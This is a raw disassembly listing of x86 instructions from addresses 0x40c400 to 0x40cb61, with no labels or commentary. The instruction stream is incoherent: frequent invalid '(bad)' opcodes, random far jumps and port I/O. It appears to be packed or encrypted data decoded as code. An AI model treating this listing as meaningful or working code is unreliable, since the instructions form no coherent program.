  40c400:	scas   al,BYTE PTR es:[edi]
  40c401:	mov    ecx,DWORD PTR [edi]
  40c403:	pop    esi
  40c404:	and    al,0x73
  40c406:	push   ecx
  40c407:	into   
  40c408:	xchg   esp,eax
  40c409:	into   
  40c40a:	push   ss
  40c40b:	cdq    
  40c40c:	add    bh,BYTE PTR [ecx+edi*2]
  40c40f:	pop    ecx
  40c410:	adc    al,0x47
  40c412:	cdq    
  40c413:	fcmovbe st,st(1)
  40c415:	adc    DWORD PTR ds:0xd35c03b7,eax
  40c41b:	add    dh,bl
  40c41d:	out    dx,al
  40c41e:	fadd   DWORD PTR [ebp-0x62]
  40c421:	pop    esi
  40c422:	mov    al,ds:0xe348f735
  40c427:	push   cs
  40c428:	or     BYTE PTR [eax-0x26],ch
  40c42b:	pop    edx
  40c42c:	into   
  40c42d:	fldenv [ebx+0xe]
  40c430:	fdiv   DWORD PTR [ebx]
  40c432:	(bad)  
  40c433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c434:	lods   al,BYTE PTR ds:[esi]
  40c435:	mov    esi,0xb7a14425
  40c43a:	xchg   esp,eax
  40c43b:	stos   BYTE PTR es:[edi],al
  40c43c:	dec    ebp
  40c43d:	into   
  40c43e:	dec    ecx
  40c43f:	or     eax,0x9cd93e47
  40c444:	xchg   ebx,eax
  40c445:	xor    al,0x2e
  40c447:	push   ebx
  40c448:	and    eax,0x155283d
  40c44d:	dec    edi
  40c44e:	mov    dl,0x27
  40c450:	clc    
  40c451:	sub    al,0x68
  40c453:	lods   al,BYTE PTR ds:[esi]
  40c454:	enter  0x3cde,0x15
  40c458:	popa   
  40c459:	lock sbb al,0xd0
  40c45c:	jbe    0x40c41f
  40c45e:	push   0xfffffffd
  40c460:	sbb    ebx,DWORD PTR [ebp+0x3592b48c]
  40c466:	outs   dx,DWORD PTR ds:[esi]
  40c467:	or     edx,DWORD PTR [ebp-0x722894be]
  40c46d:	push   ss
  40c46e:	xchg   edi,eax
  40c46f:	mov    BYTE PTR [ebx+0x6e1836bf],bl
  40c475:	jno    0x40c488
  40c477:	mov    dh,0x63
  40c479:	mul    BYTE PTR [edx+0x59]
  40c47c:	lds    ebp,FWORD PTR [ebp-0x1c]
  40c47f:	jg     0x40c413
  40c481:	cmp    ch,BYTE PTR [edi]
  40c483:	test   DWORD PTR [eax+0x6a],eax
  40c486:	lea    ecx,[esi-0x19]
  40c489:	xor    dl,dl
  40c48b:	mov    ebx,0x9b3454
  40c490:	cmp    ch,BYTE PTR [edi]
  40c492:	adc    DWORD PTR [esi],ebp
  40c494:	into   
  40c495:	dec    ebp
  40c496:	xor    eax,0x95eddb03
  40c49b:	test   eax,0x4a9c6e71
  40c4a0:	xchg   ebp,eax
  40c4a1:	inc    ebx
  40c4a2:	test   DWORD PTR [ecx-0x674aa9de],esi
  40c4a8:	call   0xf1b2:0x8f3534fa
  40c4af:	xor    bl,ch
  40c4b1:	out    0xe6,eax
  40c4b3:	mov    esp,0x8bb7b1cc
  40c4b8:	push   0x61
  40c4ba:	sahf   
  40c4bb:	imul   edx,DWORD PTR ds:0x7692bad,0x4
  40c4c2:	adc    DWORD PTR [eax-0x429fe152],ecx
  40c4c8:	cs mov al,0xba
  40c4cb:	pop    edi
  40c4cc:	ins    DWORD PTR es:[edi],dx
  40c4cd:	or     eax,0x6ce7a812
  40c4d2:	loope  0x40c51e
  40c4d4:	emms   
  40c4d6:	sub    eax,0x6c352622
  40c4db:	adc    al,0x79
  40c4dd:	(bad)  
  40c4de:	xor    DWORD PTR [ecx-0x5727e1b],ebx
  40c4e4:	inc    ebx
  40c4e5:	or     DWORD PTR [esi+0x41],edi
  40c4e8:	pushf  
  40c4e9:	imul   ebp,ebp,0xec2a35c6
  40c4ef:	addr16 mov ds:0xc7a6,al
  40c4f3:	and    DWORD PTR [edx-0x31],esi
  40c4f6:	push   esi
  40c4f7:	cwde   
  40c4f8:	daa    
  40c4f9:	fcomip st,st(0)
  40c4fb:	add    ah,BYTE PTR [edx+edi*8-0x3fa80173]
  40c502:	das    
  40c503:	mov    ch,0xb2
  40c505:	mov    bh,0x88
  40c507:	inc    edx
  40c508:	mov    al,0x42
  40c50a:	in     eax,dx
  40c50b:	bound  ebp,QWORD PTR [ebx]
  40c50d:	xor    DWORD PTR [ebx],0xffffffe7
  40c510:	outs   dx,BYTE PTR ds:[esi]
  40c511:	sub    dh,bh
  40c513:	out    dx,eax
  40c514:	cmp    ebp,edi
  40c516:	ds (bad) 
  40c51a:	mov    eax,0x34f43e7e
  40c51f:	imul   esp,DWORD PTR [ecx+0x5a],0xfffffff6
  40c523:	mov    ds:0x7e68531a,al
  40c528:	sub    al,al
  40c52a:	push   0xe9231d8f
  40c52f:	jo     0x40c570
  40c531:	inc    edx
  40c532:	adc    al,0x46
  40c534:	test   DWORD PTR [ebx],esi
  40c536:	mov    ebx,0x1664fd97
  40c53b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53d:	out    dx,eax
  40c53e:	dec    ebp
  40c53f:	in     eax,dx
  40c540:	dec    eax
  40c541:	ds jp  0x40c5a5
  40c544:	adc    ch,dh
  40c546:	push   ebp
  40c547:	pop    esi
  40c548:	xchg   DWORD PTR [ebx],edi
  40c54a:	mov    ds:0x2ffef139,al
  40c54f:	arpl   WORD PTR [edx],cx
  40c551:	cdq    
  40c552:	push   ebx
  40c553:	mov    ebp,0x43c42b48
  40c558:	mov    edx,0x9e34e098
  40c55d:	ins    DWORD PTR es:[edi],dx
  40c55e:	sahf   
  40c55f:	sbb    BYTE PTR [edx+0x2bf32ce],cl
  40c565:	cmp    eax,DWORD PTR [eax]
  40c567:	js     0x40c587
  40c569:	call   0xb0d7:0xd040660f
  40c570:	adc    cl,BYTE PTR [edi]
  40c572:	push   ds
  40c573:	shr    BYTE PTR cs:[esi],cl
  40c576:	stos   BYTE PTR es:[edi],al
  40c577:	mov    ?,WORD PTR [ebx-0x2f248c08]
  40c57d:	sub    ah,bh
  40c57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c580:	rcl    DWORD PTR [esi+0x6d9b6617],cl
  40c586:	aaa    
  40c587:	nop
  40c588:	into   
  40c589:	dec    ebp
  40c58a:	add    al,0xf3
  40c58c:	cmp    BYTE PTR [edi+esi*4-0x737ace1a],cl
  40c593:	fld    DWORD PTR [edi+0x59872e94]
  40c599:	add    ebp,DWORD PTR [ebp-0x877a1f4]
  40c59f:	stos   BYTE PTR es:[edi],al
  40c5a0:	pop    ebx
  40c5a1:	fst    QWORD PTR [edx+ebx*2-0x59611466]
  40c5a8:	loopne 0x40c550
  40c5aa:	inc    edi
  40c5ab:	jne    0x40c5a6
  40c5ad:	lods   al,BYTE PTR ds:[esi]
  40c5ae:	push   cs
  40c5af:	lods   eax,DWORD PTR ds:[esi]
  40c5b0:	dec    ebp
  40c5b1:	scas   eax,DWORD PTR es:[edi]
  40c5b2:	sahf   
  40c5b3:	das    
  40c5b4:	mov    al,ds:0xf20aadf2
  40c5b9:	retf   0x6e6a
  40c5bc:	or     DWORD PTR [eax-0x39],esp
  40c5bf:	pop    edi
  40c5c0:	cmp    ecx,DWORD PTR [eax+0x1cd947b4]
  40c5c6:	test   BYTE PTR [esi+0x53],dh
  40c5c9:	or     DWORD PTR [eax],ebx
  40c5cb:	push   cs
  40c5cc:	sti    
  40c5cd:	(bad)  
  40c5ce:	out    0x7a,al
  40c5d0:	leave  
  40c5d1:	fmul   DWORD PTR [ecx+0xe]
  40c5d4:	gs jbe 0x40c582
  40c5d7:	repnz adc DWORD PTR ds:0xfce3095a,esp
  40c5de:	cwde   
  40c5df:	rcr    DWORD PTR [ecx-0x1dd22536],1
  40c5e5:	xor    al,0xbc
  40c5e7:	sbb    ah,BYTE PTR [esi+0x778f812e]
  40c5ed:	imul   DWORD PTR [edx]
  40c5ef:	xor    eax,0xe673b700
  40c5f4:	cld    
  40c5f5:	test   DWORD PTR [ecx-0x23],0xe5fb9342
  40c5fc:	test   DWORD PTR [edi+0x1a],esp
  40c5ff:	repnz xor dh,dl
  40c602:	ret    
  40c603:	inc    ebx
  40c604:	mov    esi,0xe6175bda
  40c609:	ret    
  40c60a:	add    ah,cl
  40c60c:	inc    edx
  40c60d:	ds adc eax,0x94175c3e
  40c613:	and    BYTE PTR [edx-0x2a5456d4],ch
  40c619:	pop    edi
  40c61a:	inc    ecx
  40c61b:	dec    ebx
  40c61c:	lods   eax,DWORD PTR ds:[esi]
  40c61d:	or     DWORD PTR [ebx+0xb],esi
  40c620:	inc    esp
  40c621:	adc    ebx,DWORD PTR [ecx-0x7]
  40c624:	push   es
  40c625:	sbb    al,BYTE PTR [ecx+0x2]
  40c628:	js     0x40c5aa
  40c62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c62b:	popa   
  40c62c:	jmp    0x936aa7a5
  40c631:	and    al,0xdc
  40c633:	scas   eax,DWORD PTR es:[edi]
  40c634:	push   ss
  40c635:	lds    edi,FWORD PTR ds:0xb94d0efc
  40c63b:	push   ss
  40c63c:	sbb    DWORD PTR [ebp+0x5d09a0b4],esp
  40c642:	or     eax,0xb659efb7
  40c647:	lea    ebx,[ecx+0x36a5e6a6]
  40c64d:	adc    ch,BYTE PTR [esi-0x5cd7ff17]
  40c653:	xchg   bl,bh
  40c655:	or     eax,0x2ecb9c1a
  40c65a:	push   ss
  40c65b:	adc    eax,0x617ea913
  40c660:	mov    ebx,0x87b8fc1c
  40c665:	das    
  40c666:	cmp    DWORD PTR [edx],edx
  40c668:	xchg   esp,eax
  40c669:	gs test al,0xbf
  40c66d:	lods   eax,DWORD PTR ss:[esi]
  40c66f:	lds    edi,FWORD PTR [esi+0x7a82f385]
  40c675:	ins    DWORD PTR es:[edi],dx
  40c676:	dec    ecx
  40c677:	fmulp  st(0),st
  40c679:	sbb    eax,0x32bc873a
  40c67e:	mov    WORD PTR [edx+0x7f],es
  40c681:	mov    al,ds:0x998113d9
  40c686:	int    0xa1
  40c688:	adc    al,0x46
  40c68a:	cmp    bl,BYTE PTR [eax-0x6a]
  40c68d:	cwde   
  40c68e:	mov    ecx,0xe6904cb
  40c693:	jae    0x40c67c
  40c695:	mov    bl,BYTE PTR ds:0x51949a5a
  40c69b:	fcomp  DWORD PTR ds:0xcb2f39f1
  40c6a1:	pop    esi
  40c6a2:	ins    BYTE PTR es:[edi],dx
  40c6a3:	hlt    
  40c6a4:	and    ebp,DWORD PTR [ebp-0x4f946a43]
  40c6aa:	pop    ebx
  40c6ab:	inc    eax
  40c6ac:	in     al,0xe2
  40c6ae:	jbe    0x40c64b
  40c6b0:	ror    BYTE PTR [ecx-0x41],0x59
  40c6b4:	jmp    0xbeff:0x771afe25
  40c6bb:	popa   
  40c6bc:	or     dl,0xe
  40c6bf:	popf   
  40c6c0:	xchg   ebx,eax
  40c6c1:	pop    ebp
  40c6c2:	pop    ds
  40c6c3:	push   ebx
  40c6c4:	cmp    ecx,ebp
  40c6c6:	es dec ebx
  40c6c8:	ret    0xe3dc
  40c6cb:	ret    0x7722
  40c6ce:	sub    cl,BYTE PTR [eax+0x7f]
  40c6d1:	nop
  40c6d2:	out    dx,eax
  40c6d3:	mov    bh,0x46
  40c6d5:	adc    edx,0x8561d61c
  40c6db:	mov    ebp,0x1258807f
  40c6e0:	pop    esp
  40c6e1:	ror    edx,0xe5
  40c6e4:	cdq    
  40c6e5:	cs push cs
  40c6e7:	xor    eax,0xaecf76b
  40c6ec:	les    edi,FWORD PTR [esi+esi*2]
  40c6ef:	ret    0x5896
  40c6f2:	fst    DWORD PTR [edi+0x268f9312]
  40c6f8:	fldenv [esi]
  40c6fa:	(bad)  
  40c6fb:	or     DWORD PTR [esi],esi
  40c6fd:	test   al,0x3b
  40c6ff:	and    DWORD PTR [ebx-0x5c],esp
  40c702:	push   edi
  40c703:	rcl    BYTE PTR [esi-0x12],cl
  40c706:	sar    ch,0xd3
  40c709:	add    BYTE PTR [ebx+esi*4+0x32f22e15],bl
  40c710:	jnp    0x40c6d8
  40c712:	mov    bl,0x1c
  40c714:	xor    DWORD PTR [ebx-0x55dd08ed],ecx
  40c71a:	jp     0x40c778
  40c71c:	test   BYTE PTR [ecx+edx*8-0x605e8487],bl
  40c723:	int    0xd1
  40c725:	inc    edx
  40c726:	xor    dl,0x96
  40c729:	push   0xffffffe9
  40c72b:	pop    ecx
  40c72c:	mov    DWORD PTR [ebp+0xa849c2f],ebp
  40c732:	cld    
  40c733:	(bad)  
  40c734:	repz arpl WORD PTR ds:[esi-0x4b],cx
  40c739:	lock js 0x40c774
  40c73c:	leave  
  40c73d:	ret    0x3ce4
  40c740:	pop    eax
  40c741:	push   edx
  40c742:	(bad)  
  40c743:	mov    esp,0x4a7e1c45
  40c748:	sahf   
  40c749:	xor    bl,BYTE PTR [ebp-0x66]
  40c74c:	aas    
  40c74d:	mov    DWORD PTR [ebx-0xbb095aa],0xe2707eaa
  40c757:	sub    DWORD PTR [edi-0x215dafd],esi
  40c75d:	lahf   
  40c75e:	cmp    eax,0x647f26f3
  40c763:	(bad)  
  40c764:	mov    ds:0x60226d3b,eax
  40c769:	pop    ss
  40c76a:	push   es
  40c76b:	mov    BYTE PTR [eax+0x21],dl
  40c76e:	int3   
  40c76f:	loopne 0x40c763
  40c771:	inc    ecx
  40c772:	out    0x13,eax
  40c774:	inc    esi
  40c775:	fimul  DWORD PTR ds:0x7f7a189f
  40c77b:	push   esp
  40c77c:	sbb    esi,DWORD PTR [eax+0x43]
  40c77f:	mul    cl
  40c781:	adc    eax,0x4bd457c7
  40c786:	mov    edi,0x168050ef
  40c78b:	mov    ecx,0xebfb8140
  40c790:	into   
  40c791:	cdq    
  40c792:	pop    es
  40c793:	cld    
  40c794:	popa   
  40c795:	sub    DWORD PTR ds:0x2e2e02d8,esp
  40c79b:	jp     0x40c74f
  40c79d:	xor    eax,DWORD PTR [edx]
  40c79f:	or     al,BYTE PTR [ebx-0x1b]
  40c7a2:	pop    ds
  40c7a3:	or     al,0x65
  40c7a5:	repz jb 0x40c788
  40c7a8:	xor    dh,cl
  40c7aa:	and    BYTE PTR [edi-0x78],dh
  40c7ad:	sahf   
  40c7ae:	popf   
  40c7af:	leave  
  40c7b0:	jae    0x40c797
  40c7b2:	inc    eax
  40c7b3:	icebp  
  40c7b4:	cmp    DWORD PTR [eax+ebp*2-0x5a863155],edx
  40c7bb:	cmp    ecx,esi
  40c7bd:	out    dx,eax
  40c7be:	add    al,0x79
  40c7c0:	pusha  
  40c7c1:	cs mov esi,eax
  40c7c4:	and    BYTE PTR [edi],0x38
  40c7c7:	and    BYTE PTR [ecx],ah
  40c7c9:	inc    edi
  40c7ca:	xor    BYTE PTR [edi-0x39],ah
  40c7cd:	inc    edx
  40c7ce:	daa    
  40c7cf:	jne    0x40c7d7
  40c7d1:	dec    edi
  40c7d2:	push   esi
  40c7d3:	dec    edx
  40c7d4:	mov    dl,0x97
  40c7d6:	fcomp  QWORD PTR [edi]
  40c7d8:	cmp    DWORD PTR [esi+ebx*2],eax
  40c7db:	mov    ebx,0xc38521b8
  40c7e0:	out    dx,eax
  40c7e1:	(bad)  
  40c7e2:	ss gs xchg esp,eax
  40c7e5:	mov    eax,ds:0xc2b072e0
  40c7ea:	jge    0x40c7bc
  40c7ec:	xchg   ebx,eax
  40c7ed:	cmp    al,0x8
  40c7ef:	rcl    DWORD PTR ds:[ecx+0x44],0x85
  40c7f4:	add    edi,DWORD PTR [ecx+0xe]
  40c7f7:	sahf   
  40c7f8:	xchg   edx,eax
  40c7f9:	adc    bl,BYTE PTR [eax-0x3a9b9fcc]
  40c7ff:	push   esi
  40c800:	xchg   ecx,eax
  40c801:	leave  
  40c802:	fldcw  WORD PTR [esi+0x71fde3d7]
  40c808:	(bad)
  40c80b:	xchg   edi,eax
  40c80c:	mov    DWORD PTR [esi],ebx
  40c80e:	ret    0x6c97
  40c811:	or     BYTE PTR [ecx],ch
  40c813:	cmp    ch,ch
  40c815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c816:	adc    BYTE PTR [esi],dh
  40c818:	jnp    0x40c83f
  40c81a:	add    BYTE PTR [edx],ah
  40c81c:	ss push ebp
  40c81e:	call   0x5523:0x3e8a8733
  40c825:	js     0x40c7e6
  40c827:	jnp    0x40c7f8
  40c829:	lods   al,BYTE PTR ds:[esi]
  40c82a:	fcmovnu st,st(1)
  40c82c:	int3   
  40c82d:	push   ss
  40c82e:	xchg   ebx,eax
  40c82f:	data16 or BYTE PTR [eax+0x1d0584fd],ah
  40c836:	loope  0x40c865
  40c838:	ins    DWORD PTR es:[edi],dx
  40c839:	scas   eax,DWORD PTR es:[edi]
  40c83a:	mov    ch,0x61
  40c83c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c83d:	sbb    ebp,eax
  40c83f:	jmp    0x6358d43
  40c844:	xor    DWORD PTR [eax-0x5c],esp
  40c847:	dec    edi
  40c848:	push   cs
  40c849:	imul   edx,DWORD PTR [esp+eax*2+0x720923f6],0x7d
  40c851:	dec    eax
  40c852:	inc    ebp
  40c853:	popa   
  40c854:	loop   0x40c8c6
  40c856:	(bad)  
  40c858:	fimul  DWORD PTR [esi+0x2f]
  40c85b:	and    eax,0xa67fd09d
  40c860:	dec    edi
  40c861:	inc    ecx
  40c862:	inc    esi
  40c863:	mov    al,0xde
  40c865:	jp     0x40c8b3
  40c867:	xchg   ebp,eax
  40c868:	adc    al,dh
  40c86a:	inc    esi
  40c86b:	mov    bh,0xef
  40c86d:	jb     0x40c856
  40c86f:	push   esi
  40c870:	or     eax,0xfbc27959
  40c875:	mov    bl,0xe7
  40c877:	arpl   WORD PTR [ecx+esi*8-0x4456a7bf],bx
  40c87e:	out    0xac,eax
  40c880:	push   es
  40c881:	cmp    dh,bh
  40c883:	int    0xa0
  40c885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c886:	jl     0x40c841
  40c888:	and    DWORD PTR [esi+eiz*2+0x79adb4aa],edi
  40c88f:	push   0xffffffd7
  40c891:	mov    ecx,0x33b77e79
  40c896:	dec    esi
  40c897:	push   esp
  40c898:	inc    ebx
  40c899:	jl     0x40c8e7
  40c89b:	mov    esi,0x3fedd22e
  40c8a0:	pop    edi
  40c8a1:	push   edi
  40c8a2:	xchg   DWORD PTR [eax],edi
  40c8a4:	jmp    0x6650341b
  40c8a9:	fadd   QWORD PTR [ecx+eiz*1-0x5b]
  40c8ad:	mov    dl,0x9a
  40c8af:	pcmpgtb mm5,QWORD PTR [eax-0x7c]
  40c8b3:	sbb    eax,0x29c4b02c
  40c8b8:	daa    
  40c8b9:	sub    BYTE PTR [eax+0x56],0xb9
  40c8bd:	clc    
  40c8be:	and    esp,DWORD PTR [edx]
  40c8c0:	push   ss
  40c8c1:	inc    ecx
  40c8c2:	fld    TBYTE PTR [ecx]
  40c8c4:	adc    BYTE PTR [esi+0x72],dh
  40c8c7:	or     eax,0xe1b68a66
  40c8cc:	cli    
  40c8cd:	ret    0xed0b
  40c8d0:	sahf   
  40c8d1:	cmp    eax,0x83c41f4e
  40c8d6:	lock jg 0x40c894
  40c8d9:	lds    edx,FWORD PTR [eax+0xe01aa16]
  40c8df:	xor    esi,DWORD PTR [ebx]
  40c8e1:	test   DWORD PTR [edi],ecx
  40c8e3:	mov    esp,0x94f3988e
  40c8e8:	pop    ecx
  40c8e9:	pop    ss
  40c8ea:	jl     0x40c8cf
  40c8ec:	fwait
  40c8ed:	cmp    al,0xab
  40c8ef:	or     eax,0x645f68be
  40c8f4:	mov    bh,0xed
  40c8f6:	mov    bl,0x92
  40c8f8:	xor    edi,DWORD PTR [edi]
  40c8fa:	mov    ebx,0x8560cf74
  40c8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c900:	sbb    BYTE PTR [ebx+0x390c850e],0xfe
  40c907:	xor    eax,0x33647088
  40c90c:	cwde   
  40c90d:	jno    0x40c94c
  40c90f:	sub    eax,0xbbc6802f
  40c914:	aas    
  40c915:	outs   dx,DWORD PTR ds:[esi]
  40c916:	inc    edi
  40c917:	(bad)  
  40c919:	aad    0xdd
  40c91b:	push   cs
  40c91c:	dec    ebx
  40c91d:	popfw  
  40c91f:	jae    0x40c90f
  40c921:	adc    al,0x7d
  40c923:	dec    esp
  40c924:	jmp    FWORD PTR [ebp+0x1fab0da9]
  40c92a:	jbe    0x40c917
  40c92c:	pop    esi
  40c92d:	xchg   edx,eax
  40c92e:	push   ds
  40c92f:	push   eax
  40c930:	dec    eax
  40c931:	int3   
  40c932:	sbb    bl,al
  40c934:	push   esi
  40c935:	rol    esp,0x70
  40c938:	(bad)  
  40c939:	push   ebp
  40c93a:	or     eax,0x2f4ebb4b
  40c93f:	mov    BYTE PTR [ecx],bh
  40c941:	xchg   esi,eax
  40c942:	add    BYTE PTR [ecx],ah
  40c944:	adc    DWORD PTR [edx+0x7],edi
  40c947:	je     0x40c91f
  40c949:	les    ecx,FWORD PTR [edi+edi*8-0x3339543]
  40c950:	dec    ecx
  40c951:	xchg   esp,eax
  40c952:	pop    edi
  40c953:	leave  
  40c954:	scas   eax,DWORD PTR es:[edi]
  40c955:	xchg   edi,eax
  40c956:	mov    dh,al
  40c958:	data16 loop 0x40c998
  40c95b:	xor    eax,0x25f0976
  40c960:	ret    
  40c961:	jge    0x40c9b4
  40c963:	jecxz  0x40c9e3
  40c965:	push   ecx
  40c966:	cmovge edi,DWORD PTR [esi+0x67]
  40c96a:	xor    ebx,ecx
  40c96c:	or     al,0x5f
  40c96e:	mov    ebp,0x31d56a41
  40c973:	inc    esi
  40c974:	cs sbb ch,dh
  40c977:	xor    DWORD PTR [edi+0x5155d31e],ecx
  40c97d:	out    dx,eax
  40c97e:	mov    eax,ecx
  40c980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c981:	add    BYTE PTR [esi+0x10],dh
  40c984:	mov    eax,DWORD PTR [ebx]
  40c986:	sbb    al,0xa4
  40c988:	mov    esp,0xb6ef21d6
  40c98d:	das    
  40c98e:	stos   BYTE PTR es:[edi],al
  40c98f:	mov    ah,0x1c
  40c991:	rol    BYTE PTR [ecx],0x56
  40c994:	(bad)  
  40c995:	test   BYTE PTR [esi],0x7d
  40c998:	dec    edx
  40c999:	ror    BYTE PTR [esi-0x7ca7bdce],1
  40c99f:	lahf   
  40c9a0:	ja     0x40c9f7
  40c9a2:	cmp    BYTE PTR [eax-0xe31f340],bl
  40c9a8:	adc    dh,BYTE PTR [ebp+0x376b0149]
  40c9ae:	ja     0x40ca22
  40c9b0:	mov    ah,0xec
  40c9b2:	push   esp
  40c9b3:	fistp  QWORD PTR [ecx]
  40c9b5:	push   eax
  40c9b6:	xchg   ebx,eax
  40c9b7:	mov    al,0xbe
  40c9b9:	ins    BYTE PTR es:[edi],dx
  40c9ba:	or     BYTE PTR [esi+ebp*4+0x281a2016],cl
  40c9c1:	fwait
  40c9c2:	call   0x3f18:0xe8819c78
  40c9c9:	jp     0x40c9a8
  40c9cb:	ins    BYTE PTR es:[edi],dx
  40c9cc:	dec    DWORD PTR [ebp-0x8]
  40c9cf:	mov    edx,0x2112f723
  40c9d4:	dec    eax
  40c9d5:	out    0x6,eax
  40c9d7:	push   ecx
  40c9d8:	imul   ecx,DWORD PTR [eax],0xffffffc3
  40c9db:	leave  
  40c9dc:	sub    ch,dh
  40c9de:	cli    
  40c9df:	xor    DWORD PTR ds:0x3d07b236,edi
  40c9e5:	fimul  WORD PTR [edi+ebx*8-0x61]
  40c9e9:	in     eax,0xbd
  40c9eb:	mov    edx,0xc92acbe3
  40c9f0:	int3   
  40c9f1:	retf   
  40c9f2:	sub    DWORD PTR [ebx+0x19],eax
  40c9f5:	push   cs
  40c9f6:	in     al,0xa3
  40c9f8:	cwde   
  40c9f9:	sbb    edx,esp
  40c9fb:	inc    eax
  40c9fc:	das    
  40c9fd:	xor    esi,DWORD PTR [ebx+edx*8+0x17]
  40ca01:	mov    esp,0x4eecf772
  40ca06:	nop
  40ca07:	stos   BYTE PTR es:[edi],al
  40ca08:	xor    DWORD PTR [ecx+0x18367678],ebx
  40ca0e:	jno    0x40ca26
  40ca10:	xor    BYTE PTR [edx-0x4c],bl
  40ca13:	sub    eax,DWORD PTR [ebx+ebx*2-0x6223edce]
  40ca1a:	xor    edx,ebp
  40ca1c:	sub    al,0x1d
  40ca1e:	hlt    
  40ca1f:	(bad)  
  40ca20:	shl    DWORD PTR [ebp+eiz*1+0x581e92d7],1
  40ca27:	out    dx,eax
  40ca28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca29:	lds    eax,FWORD PTR [edi+0x1c]
  40ca2c:	xor    ebp,DWORD PTR [ecx+ebx*2+0x7565f9a9]
  40ca33:	out    dx,eax
  40ca34:	test   DWORD PTR [ebx-0x75],edi
  40ca37:	xchg   edx,eax
  40ca38:	xor    edi,DWORD PTR [edx-0x39ce2b18]
  40ca3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca3f:	imul   esp,esp,0xffffff9e
  40ca42:	test   eax,0xd616e957
  40ca47:	xchg   edi,eax
  40ca48:	adc    dl,ah
  40ca4a:	adc    al,BYTE PTR [esi-0x42af585f]
  40ca50:	mov    DWORD PTR [eax],eax
  40ca52:	leave  
  40ca53:	inc    eax
  40ca54:	aam    0x23
  40ca56:	sub    al,0x6a
  40ca58:	xchg   al,al
  40ca5a:	mov    ebx,0xcd49a30a
  40ca5f:	inc    ebx
  40ca60:	mov    fs,WORD PTR [edx+0x2e]
  40ca63:	(bad)  
  40ca64:	and    dh,BYTE PTR [edi+0x27e3cd52]
  40ca6a:	imul   esp,DWORD PTR [edi],0x54
  40ca6d:	add    al,0xc6
  40ca6f:	je     0x40ca1a
  40ca71:	lahf   
  40ca72:	icebp  
  40ca73:	inc    edi
  40ca74:	and    al,0xb3
  40ca76:	mov    ecx,0xc771f985
  40ca7b:	(bad)  
  40ca7c:	out    0xce,al
  40ca7e:	inc    esi
  40ca7f:	adc    BYTE PTR [ebp+0x575cabf],al
  40ca85:	sbb    al,0x96
  40ca87:	jb     0x40ca65
  40ca89:	inc    ebp
  40ca8a:	(bad)  
  40ca8c:	cmp    eax,0x356ffee6
  40ca91:	or     DWORD PTR [ecx+0x1e],edi
  40ca94:	xchg   esp,eax
  40ca95:	xor    DWORD PTR [ebx-0x2a],edi
  40ca98:	repnz and BYTE PTR [ebp-0x5c],dl
  40ca9c:	push   0x7a5fb267
  40caa1:	out    0x13,eax
  40caa3:	lods   al,BYTE PTR ds:[esi]
  40caa4:	call   0x544d:0xef7cb550
  40caab:	dec    ecx
  40caac:	les    ebx,FWORD PTR [ebp+0x72]
  40caaf:	push   cs
  40cab0:	nop
  40cab1:	out    0xfb,eax
  40cab3:	cmp    ah,bh
  40cab5:	xchg   esi,eax
  40cab6:	hlt    
  40cab7:	fisubr WORD PTR [eax+0x5b]
  40caba:	xor    ecx,DWORD PTR [edi+0x45]
  40cabd:	lods   al,BYTE PTR ds:[esi]
  40cabe:	pop    edi
  40cabf:	test   eax,0xe489ce0d
  40cac4:	pop    edx
  40cac5:	mov    ds,WORD PTR [eax]
  40cac7:	pushf  
  40cac8:	push   ss
  40cac9:	push   ebp
  40caca:	ret    
  40cacb:	inc    ecx
  40cacd:	hlt    
  40cace:	je     0x40cabf
  40cad0:	enter  0xf498,0x15
  40cad4:	ret    
  40cad5:	inc    ebx
  40cad6:	mov    edi,0x595a3cba
  40cadb:	pop    edi
  40cadc:	cs jg  0x40cb16
  40cadf:	jp     0x40cb27
  40cae1:	pop    edi
  40cae2:	gs add al,0x2
  40cae5:	jae    0x40cac0
  40cae7:	je     0x40ca72
  40cae9:	and    al,bl
  40caeb:	or     BYTE PTR [eax],ch
  40caed:	add    cl,BYTE PTR [ebp-0x2c]
  40caf0:	loope  0x40cb2e
  40caf2:	es sbb al,0xd9
  40caf5:	cmp    bh,BYTE PTR [eax+ebx*2-0x2f220be4]
  40cafc:	mov    cl,0x52
  40cafe:	sbb    DWORD PTR [edx+0x3ae5660a],edi
  40cb04:	jae    0x40cb1f
  40cb06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb07:	in     eax,dx
  40cb08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb09:	(bad)  
  40cb0a:	xor    BYTE PTR [ecx],dl
  40cb0c:	hlt    
  40cb0d:	nop
  40cb0e:	shl    DWORD PTR [esi+0xca119ed],1
  40cb14:	push   0x6e
  40cb16:	jno    0x40cacc
  40cb18:	xrelease xchg DWORD PTR es:0xfa2d22d1,ebx
  40cb20:	cmp    esp,DWORD PTR [esi+0xfe9f134]
  40cb26:	mov    bh,0x54
  40cb28:	pop    esp
  40cb29:	dec    edx
  40cb2a:	retf   
  40cb2b:	add    eax,0x6fd5925c
  40cb30:	lods   eax,DWORD PTR ds:[esi]
  40cb31:	sub    al,ch
  40cb33:	jmp    0x74088a7d
  40cb38:	mov    bh,0x83
  40cb3a:	mov    WORD PTR [edi],es
  40cb3c:	pop    si
  40cb3e:	aad    0xfb
  40cb40:	lahf   
  40cb41:	xor    BYTE PTR [ebx],bh
  40cb43:	xchg   DWORD PTR [ebx+0xfdf0875],edi
  40cb49:	loope  0x40cb53
  40cb4b:	xchg   edi,eax
  40cb4c:	jmp    0x40cb8c
  40cb4e:	loopne 0x40cb01
  40cb50:	out    0xb8,eax
  40cb52:	nop
  40cb53:	dec    edx
  40cb54:	mov    esi,0x6453eda8
  40cb59:	das    
  40cb5a:	inc    ecx
  40cb5b:	fbstp  TBYTE PTR [ebp+esi*2-0x46]
  40cb5f:	push   0xfffffffd
  40cb61:	add    BYTE PTR [ebp+0x6e0585d],0xf8
